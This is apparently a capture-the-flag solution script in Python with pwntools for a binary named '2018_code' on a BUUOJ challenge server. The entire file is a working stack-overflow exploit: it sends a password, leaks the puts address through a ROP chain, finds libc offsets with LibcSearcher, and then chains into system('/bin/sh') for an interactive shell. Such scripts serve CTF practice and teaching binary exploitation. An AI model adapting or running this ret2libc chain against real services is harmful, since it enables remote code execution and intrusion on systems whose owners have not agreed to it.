from pwn import *

context(log_level='debug',arch='amd64')

#io=process("./2018_code")
io=remote("node3.buuoj.cn",25540)
elf=ELF("./2018_code")

io.recv()

io.sendline('wyBTs')

io.recv()

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

have_fun=0x400801

pop_rdi_ret=0x400983

payload=b'A'*(0x70+8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(have_fun)

io.sendline(payload)

io.recvuntil(b'\x0a')

puts=u64(io.recv(6).ljust(8,b'\x00'))

print(hex(puts))

io.recv()

from LibcSearcher import *  

libc = LibcSearcher('puts',puts)  
#获取libc加载地址  
libc_base = puts - libc.dump('puts')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')

ret=0x40055e

payload=b'A'*(0x70+8)+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)

io.sendline(payload)

io.recv()

io.interactive() 